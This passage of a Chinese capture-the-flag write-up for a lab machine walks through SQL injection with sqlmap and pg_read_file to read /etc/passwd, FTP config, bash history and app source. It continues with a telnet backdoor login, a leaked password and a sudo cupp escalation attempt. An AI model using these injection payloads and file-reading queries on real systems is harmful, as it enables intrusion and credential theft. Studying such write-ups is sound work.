Server,,,:/nonexistent:/bin/false\\nsamba_user:x:1003:1003::/home/samba_user:/bin/false\\n_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin\\nstatd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin\\npostgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\\ntodd:x:1000:1000:,,,:/home/todd:/bin/bash\\n'\n[23:42:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'\n\n[*] ending @ 23:42:07 /2025-07-21/\n```\n\n- `xiao:x:1001:1001::/home/xiao:/bin/bash`\n- `secure_user:x:1002:1002::/home/secure_user:/bin/bash`\n- `todd:x:1000:1000:,,,:/home/todd:/bin/bash`\n\n\u5c1d\u8bd5\u8bfb\u53d6\u5bc6\u94a5\uff0c\u5168\u90fd\u6ca1\u6709\u6743\u9650\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)'\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.6#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:50:12 /2025-07-21/\n\n[23:50:12] [INFO] parsing HTTP request from 'tmp/1'\n[23:50:12] [INFO] resuming back-end DBMS 'postgresql' \n[23:50:12] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka\n---\n[23:50:12] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[23:50:12] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)'\n[23:50:12] [WARNING] reflective value(s) found and filtering out\nSELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000): 'listen=NO\\nlisten_ipv6=YES\\nanonymous_enable=NO\\nlocal_enable=YES\\nwrite_enable=YES\\nlocal_umask=022\\ndirmessage_enable=YES\\nuse_localtime=YES\\nxferlog_enable=YES\\nconnect_from_port_20=YES\\nchroot_local_user=YES\\nallow_writeable_chroot=YES\\nsecure_chroot_dir=/var/run/vsftpd/empty\\npam_service_name=vsftpd\\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\\nssl_enable=YES\\nallow_anon_ssl=NO\\nforce_local_data_ssl=YES\\nforce_local_logins_ssl=YES\\nssl_tlsv1=YES\\nssl_sslv2=NO\\nssl_sslv3=NO\\nrequire_ssl_reuse=NO\\nssl_ciphers=HIGH\\npasv_min_port=50000\\npasv_max_port=50050\\nuserlist_enable=YES\\nuserlist_file=/etc/vsftpd.userlist\\nuserlist_deny=NO\\n'\n[23:50:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'\n\n[*] ending @ 23:50:12 /2025-07-21/\n\n```\n\nvsftpd\u5176\u4e2d\u91cd\u70b9\u7684\u4e1c\u897f\n\n> listen=NO\n> listen_ipv6=YES\n> anonymous_enable=NO     # \u4e0d\u5141\u8bb8\u533f\u540d\u767b\u5f55\uff0c\u8fd9\u548c\u6211\u4eec\u4e4b\u524d\u7684\u6d4b\u8bd5\u7ed3\u679c\u4e00\u81f4\n> local_enable=YES        # \u5141\u8bb8\u672c\u5730\u7528\u6237\u767b\u5f55\uff0c\u8fd9\u662f\u5173\u952e\n> write_enable=YES        # \u5141\u8bb8\u5199\u5165\uff01\u8fd9\u662f\u53e6\u4e00\u4e2a\u5173\u952e\n> ...\n> chroot_local_user=YES   # \u5c06\u7528\u6237\u9650\u5236\u5728\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u4e2d\n> allow_writeable_chroot=YES # \u5141\u8bb8\u5bb6\u76ee\u5f55\u53ef\u5199\uff08\u8fd9\u662f\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u914d\u7f6e\uff0c\u901a\u5e38\u9700\u8981\u907f\u514d\uff09\n> ...\n> pam_service_name=vsftpd\n> ...\n> userlist_enable=YES      # <-- \uff01\uff01\uff01 \u5f00\u542f\u4e86\u7528\u6237\u5217\u8868\u529f\u80fd\n> userlist_file=/etc/vsftpd.userlist # <-- \uff01\uff01\uff01 \u6307\u5b9a\u4e86\u7528\u6237\u5217\u8868\u6587\u4ef6\n> userlist_deny=NO         # <-- \uff01\uff01\uff01 \u8fd9\u662f\u51b3\u5b9a\u6027\u7684\u4e00\u51fb\uff01\n\n\u6252\u62c9\u4ed6\u7528\u6237\u5217\u8868\u6587\u4ef6\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)'\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.9.6#stable}\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:51:25 /2025-07-21/\n\n[23:51:25] [INFO] parsing HTTP request from 'tmp/1'\n[23:51:25] [INFO] resuming back-end DBMS 'postgresql' \n[23:51:25] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka\n---\n[23:51:25] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[23:51:25] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000)'\n[23:51:25] [WARNING] reflective value(s) found and filtering out\nSELECT pg_read_file('/etc/vsftpd.userlist', 0, 1000000): 'secure_user\\n'\n[23:51:25] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'\n\n[*] ending @ 23:51:25 /2025-07-21/\n```\n\n\u53ea\u6709 **secure_user** \u8fd9\u4e00\u4e2a\u7528\u6237\u88ab\u6388\u6743\u53ef\u4ee5\u901a\u8fc7 FTP \u670d\u52a1\u8fdb\u884c\u767b\u5f55\u5c1d\u8bd5\n\n\u6211\u4eec\u8fdb\u884c\u767b\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ftp 192.168.205.205\nConnected to 192.168.205.205.\n220 (vsFTPd 3.0.3)\nName (192.168.205.205:kali): secure_user\n530 Non-anonymous sessions must use encryption.\nftp: Login failed\nftp> exit\n```\n\n\u53eb\u6211\u4eec\u52a0\u5bc6\u4f1a\u8bdd\uff0c\u6240\u4ee5\u6362lftp\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ lftp -u secure_user 192.168.205.205\n\u5bc6\u7801: secure_user\nlftp secure_user@192.168.205.205:~> ls                \nls: \u4e25\u91cd\u9519\u8bef: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (71:24:67:D0:3C:52:A2:8F:AF:8F:11:F9:D1:D7:19:08:A1:20:35:49)\n```\n\n\u7981\u7528\u8bc1\u4e66\n\n```bash\nlftp secure_user@192.168.205.205:~> set ssl:verify-certificate no\nlftp secure_user@192.168.205.205:~> ls\nls: \u767b\u5f55\u5931\u8d25: 530 Login incorrect.       \n```\n\n\u5bc6\u7801\u662f\u9519\u7684\uff0c\u540e\u9762\u5c1d\u8bd5\u4e86\u7206\u7834\uff0c\u6ca1\u6709\u6536\u83b7\uff0c\u5c31\u56de\u53bb\u770bsql\u4e86\n\n\u67e5\u770bSQL\u6743\u9650\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT current_user'\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.9.6#stable}\n|_ -| . [.]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 00:11:48 /2025-07-22/\n\n[00:11:48] [INFO] parsing HTTP request from 'tmp/1'\n[00:11:48] [INFO] resuming back-end DBMS 'postgresql' \n[00:11:48] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka\n---\n[00:11:48] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[00:11:48] [INFO] fetching SQL SELECT statement query output: 'SELECT current_user'\n[00:11:48] [WARNING] reflective value(s) found and filtering out\nSELECT current_user: 'dvuser'\n[00:11:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'\n\n[*] ending @ 00:11:48 /2025-07-22/\n```\n\n\u8bfb\u53d6\u4e00\u4e0b\u4ed6\u7684\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.9.6#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 00:13:37 /2025-07-22/\n\n[00:13:37] [INFO] parsing HTTP request from 'tmp/1'\n[00:13:37] [INFO] resuming back-end DBMS 'postgresql' \n[00:13:37] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka\n---\n[00:13:37] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[00:13:37] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000)'\n[00:13:37] [WARNING] reflective value(s) found and filtering out\nSELECT pg_read_file('/var/lib/postgresql/.bash_history', 0, 1000000): 'geAbgWpouT=xBcZHwGxAX KOxuJqpGxZ=KEqNdLkFrf;printf $geAbgWpouT$KOxuJqpGxZ;echo $$;printf $KOxuJqpGxZ$geAbgWpouT\\n hSAkQvpQLQ=lTHFyQbFqh nSpdwixuov=CqlpNdGWDg;printf $hSAkQvpQLQ$nSpdwixuov;echo '$(id -un)($(id -u))';printf $nSpdwixuov$hSAkQvpQLQ\\n SNBrffgiiZ=ELTGdWlbkd ranIeerCgZ=dhqaYbOtwr;printf $SNBrffgiiZ$ranIeerCgZ;tty;printf $ranIeerCgZ$SNBrffgiiZ\\ncd /home\\nfind \\ncd /usr/local/bin\\nls -la\\ncat custom_login \\ncat /etc/default/telnet\\necho 'ENABLE_BACKDOOR' > /etc/default/telnet\\ncd /var/www/html/\\nls -la\\ncd pub/\\nls -la\\ntouch a\\ncd /home\\ncd /opt\\nls\\ncat app.py \\ncd /srv\\nls -la\\nfind\\nls -la\\ncd secure_share/\\n'\n[00:13:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'\n\n[*] ending @ 00:13:37 /2025-07-22/\n```\n\n>... (\u4e00\u4e9b\u6df7\u6dc6\u89c6\u542c\u7684\u547d\u4ee4) ...\n>\n>cd /opt          # <-- \u4ed6\u8fdb\u5165\u4e86 /opt \u76ee\u5f55\n>ls\n>cat app.py       # <-- \uff01\uff01\uff01\u4ed6\u67e5\u770b\u4e86\u4e00\u4e2a\u53eb\u505a app.py \u7684\u6587\u4ef6\uff01\n>cd /srv\n>ls -la\n>find\n>ls -la\n>cd secure_share/ # <-- \u8fd9\u4e2a\u5171\u4eab\u76ee\u5f55\u6211\u4eec\u4e4b\u524d\u89c1\u8fc7\n\n\u53bb\u770b\u770bapp.py\u7684\u6e90\u7801\n\n```bash\n\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/opt/app.py', 0, 1000000)'\n        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.9.6#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 00:14:51 /2025-07-22/\n\n[00:14:51] [INFO] parsing HTTP request from 'tmp/1'\n[00:14:51] [INFO] resuming back-end DBMS 'postgresql' \n[00:14:51] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: keyword (POST)\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka\n---\n[00:14:51] [INFO] the back-end DBMS is PostgreSQL\nback-end DBMS: PostgreSQL\n[00:14:51] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/opt/app.py', 0, 1000000)'\n[00:14:51] [WARNING] reflective value(s) found and filtering out\nSELECT pg_read_file('/opt/app.py', 0, 1000000): 'from flask import Flask, request, render_template_string, redirect, session\\nimport psycopg2\\n\\napp = Flask(__name__)\\napp.secret_key = 's3cret_key'\\n\\n# Database connection\\nconn = psycopg2.connect(\\n    dbname='dvtest',\\n    user='dvuser',\\n    password='dvpass',\\n    host='localhost',\\n    port='5432'\\n)\\n\\n# HTML template with search form\\nTEMPLATE = '''\\n<!doctype html>\\n<html>\\n<head>\\n    <title>Admin Panel</title>\\n    <style>\\n        body { font-family: Arial, sans-serif; margin: 20px; }\\n        table { border-collapse: collapse; width: 100%; }\\n        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\\n        th { background-color: #f2f2f2; }\\n        .error { color: red; }\\n    </style>\\n</head>\\n<body>\\n    <h2>Welcome{% if user %}, {{ user }}{% endif %}</h2>\\n    {% if not user %}\\n        <form method='POST' action='/'>\\n            Username: <input name='username' required>\\n            <input type='submit' value='Login'>\\n        </form>\\n    {% else %}\\n        <p><a href='/search'>User Search</a> | <a href='/logout'>Logout</a></p>\\n        <form method='POST' action='/search'>\\n            Search User: <input name='keyword' placeholder='Enter username' value='{{ keyword|default('') }}'>\\n            <input type='submit' value='Search'>\\n        </form>\\n    {% endif %}\\n    {% if results %}\\n        <h3>Search Results</h3>\\n        <table>\\n            <tr><th>ID</th><th>Username</th><th>Email</th></tr>\\n            {% for row in results %}\\n                <tr><td>{{ row[0] }}</td><td>{{ row[1] }}</td><td>{{ row[2] }}</td></tr>\\n            {% endfor %}\\n        </table>\\n    {% endif %}\\n    {% if message %}\\n        <p class='error'>{{ message }}</p>\\n    {% endif %}\\n</body>\\n</html>\\n'''\\n\\n@app.route('/', methods=['GET', 'POST'])\\ndef login():\\n    if request.method == 'POST':\\n        username = request.form.get('username')\\n        if username:\\n            session['user'] = username\\n            return redirect('/search')\\n        return render_template_string(TEMPLATE, user=None, message='Username cannot be empty')\\n    return render_template_string(TEMPLATE, user=None)\\n\\n@app.route('/logout')\\ndef logout():\\n    session.pop('user', None)\\n    return redirect('/')\\n\\n@app.route('/search', methods=['GET', 'POST'])\\ndef search():\\n    if 'user' not in session:\\n        return redirect('/')\\n    \\n    results = []\\n    message = None\\n    keyword = ''\\n    \\n    if request.method == 'POST':\\n        keyword = request.form.get('keyword', '')\\n        try:\\n            cur = conn.cursor()\\n            # Vulnerable SQL query: allows injection of commands like COPY TO PROGRAM\\n            # Example exploit: ' OR 1=1; COPY users TO PROGRAM 'whoami'; --\\n            sql = f'SELECT id, username, email FROM users WHERE username LIKE '%{keyword}%''\\n            cur.execute(sql)\\n            results = cur.fetchall()\\n            conn.commit()\\n        except Exception as e:\\n            conn.rollback()\\n            message = f'Query failed: {str(e)}'\\n    \\n    return render_template_string(TEMPLATE, user=session['user'], results=results, message=message, keyword=keyword)\\n\\nif __name__ == '__main__':\\n    app.run(host='0.0.0.0', port=28080)\\n'\n[00:14:51] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'\n\n[*] ending @ 00:14:51 /2025-07-22/\n```\n\n\u540e\u9762\u6252\u62c9\u4e86\u4e00\u4f1a\uff0c\u60ca\u5947\u7684\u53d1\u73b0\u524d\u9762\u767d\u5e72\u4e86\uff0ctelnet\u662f\u4e2a\u540e\u95e8\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ telnet 192.168.205.205\nTrying 192.168.205.205...\nConnected to 192.168.205.205.\nEscape character is '^]'.\nUsername: \nxiao  \nPassword: \nlogin successful\nLinux Multi 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\nYour session is being monitored per security policy\nxiao@Multi:~$ id\nuid=1001(xiao) gid=1001(xiao) groups=1001(xiao)\n```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## to todd\n\n```bash\nxiao@Multi:~$ sudo -l\nSudo access restricted by policy (CODE:0x7E3) -l\nxiao@Multi:~$ ls -al\ntotal 24\ndrwx------ 2 xiao xiao 4096 Jul 18 22:46 .\ndrwxr-xr-x 5 root root 4096 Jul 17 09:04 ..\nlrwxrwxrwx 1 root root    9 Jul 18 11:13 .bash_history -> /dev/null\n-rw-r--r-- 1 xiao xiao  220 Apr 18  2019 .bash_logout\n-rw-r--r-- 1 xiao xiao 3526 Apr 18  2019 .bashrc\n-rw-r--r-- 1 xiao xiao  807 Apr 18  2019 .profile\n-rw------- 1 xiao xiao   44 Jul 17 07:31 user.txt\nxiao@Multi:~$ cat user.txt \nflag{user-33b02bc15ce9557d2dd8484d58f95ac4}\nxiao@Multi:~$ which sudo\n/usr/bin/sudo\nxiao@Multi:~$ /usr/bin/sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\nFor security reasons, the password you type will not be visible.\n\n[sudo] password for xiao: \nsudo: a password is required\n```\n\nsudo\u88ab\u9650\u5236\u4e86\uff0c\u770b\u770b\u5176\u4ed6\u7684\n```bash\nxiao@Multi:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/sbin/mount.nfs\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/telnetlogin\n/usr/libexec/polkit-agent-helper-1\nxiao@Multi:~$ getcap -r / 2>/dev/null\nxiao@Multi:~$ ls -al /opt/\ntotal 12\ndrwxr-xr-x  2 root root 4096 Jul 18 11:21 .\ndrwxr-xr-x 18 root root 4096 Mar 18 20:37 ..\n-rw-r--r--  1 root root 3136 Jul 18 11:21 app.py\nxiao@Multi:~$ find / -user xiao ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null\n/dev/pts/0\n/home/xiao\n/home/xiao/.bash_logout\n/home/xiao/.bashrc\n/home/xiao/user.txt\n/home/xiao/.profile\n/var/www/html/pub\n```\n\n`/var/www/html/pub`\u8fd9\u4e2a\u76ee\u5f55\u4e4b\u524d\u7206\u7834\u5230\u4e86\uff0c\u4f46\u662f\u4ec0\u4e48\u4e1c\u897f\u90fd\u6ca1\u6709\uff0c\u6211\u4eec\u53bb\u770b\u770b\n\n```bash\nxiao@Multi:~$ cd /var/www/html/pub\nxiao@Multi:/var/www/html/pub$ ls -al\ntotal 16\ndrwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 .\ndrwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..\n-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html\n-rw------- 1 www-data www-data   19 Jul 17 09:06 xiao@Multi:~$ cd /var/www/html/pub\nxiao@Multi:/var/www/html/pub$ ls -al\ntotal 16\ndrwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 .\ndrwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..\n-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html\n-rw------- 1 www-data www-data   19 Jul 17 09:06 .passowrd_creds\n```\n\n\u6709\u4e00\u4e2a`.passowrd_creds`\uff0c\u53bbweb\u8bfb\u4e00\u4e0b\n\n\u62ff\u5230\u4e86\u4e00\u4e2a\u5bc6\u7801`koUF5q)*RN&m0PTB&D`\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u662ftodd\u7684\u5bc6\u7801\n\n```bash\nxiao@Multi:/var/www/html/pub$ su todd\nUse of su is prohibited (CODE:0x9F2) todd\nxiao@Multi:/var/www/html/pub$ which su\n/usr/bin/su\nxiao@Multi:/var/www/html/pub$ /usr/bin/su todd\nPassword: \ntodd@Multi:/var/www/html/pub$ id\nuid=1000(todd) gid=1000(todd) groups=1000(todd)\n```\n\n## to root\n\n```bash\ntodd@Multi:/var/www/html/pub$ sudo -l\nMatching Defaults entries for todd on Multi:\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+='LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET', env_keep+='XAPPLRESDIR XFILESEARCHPATH\n    XUSERFILESEARCHPATH', mail_badpass\n\nRunas and Command-specific defaults for todd:\n    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'\n\nUser todd may run the following commands on Multi:\n    (ALL : ALL) NOPASSWD: /usr/bin/cupp\n```\n\n\u8fd9\u91cc\u5e94\u8be5\u5c31\u662f\u8fd9\u4e2a\u9776\u673a\u6709\u610f\u601d\u7684\u70b9\u4e86\uff0ccupp\u662f\u4e00\u4e2a\u5b57\u5178\u751f\u6210\u5668\n\n```bash\ntodd@Multi:/var/www/html/pub$ sudo /usr/bin/cupp -h\nusage: cupp [-h] [-i | -w FILENAME | -l | -a | -v] [-q]\n\nCommon User Passwords Profiler\n\noptional arguments:\n  -h, --help         show this help message and exit\n  -i, --interactive  Interactive questions for user password profiling\n  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce\n  -l                 Download huge wordlists from repository\n  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced\n  -v, --version      Show the version of this program.\n  -q, --quiet        Quiet mode (don't print banner)\n```\n\n\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u4f60\u5e94\u8be5\u4f1a\u53d1\u73b0`-i` ,`-w` \u751f\u6210\u7684\u5b57\u5178\u4f1a\u56fa\u5b9a`.txt`\u7684\u540e\u7f00\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u5229\u7528\n\n\u6bd4\u8f83\u53ef\u80fd\u6027\u7684\u662f`-l`\n\n\u5177\u4f53\u64cd\u4f5c\n\n```bash\ntodd@Multi:/var/www/html/pub$ cd \ntodd@Multi:~$ sudo /usr/bin/cupp -l\n ___________ \n   cupp.py!                 # Common\n      \\                     # User\n       \\   ,__,             # Passwords\n        \\  (oo)____         # Profiler\n           (__)    )\\   \n              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]\n                            [ Mebus | https://github.com/Mebus/]\n\n\n        Choose the section you want to download:\n\n     1   Moby            14      french          27      places\n     2   afrikaans       15      german          28      polish\n     3   american        16      hindi           29      random\n     4   aussie          17      hungarian       30      religion\n     5   chinese         18      italian         31      russian\n     6   computer        19      japanese        32      science\n     7   croatian        20      latin           33      spanish\n     8   czech           21      literature      34      swahili\n     9   danish          22      movieTV         35      swedish\n    10   databases       23      music           36      turkish\n    11   dictionaries    24      names           37      yiddish\n    12   dutch           25      net             38      exit program\n    13   finnish         26      norwegian       \n\n\n        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository\n\n        Tip: After downloading wordlist, you can improve it with -w option\n\n> Enter number: 1\n[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... \n^CTraceback (most recent call last):\n  File '/usr/bin/cupp', line 1078, in <module>\n    main()\n  File '/usr/bin/cupp', line 1024, in main\n    download_wordlist()\n  File '/usr/bin/cupp', line 782, in download_wordlist\n    download_wordlist_http(filedown)\n  File '/usr/bin/cupp', line 993, in download_wordlist_http\n    download_http(url, tgt)\n  File '/usr/bin/cupp', line 698, in download_http\n    localFile.write(webFile.read())\n  File '/usr/lib/python3.9/http/client.py', line 471, in read\n    s = 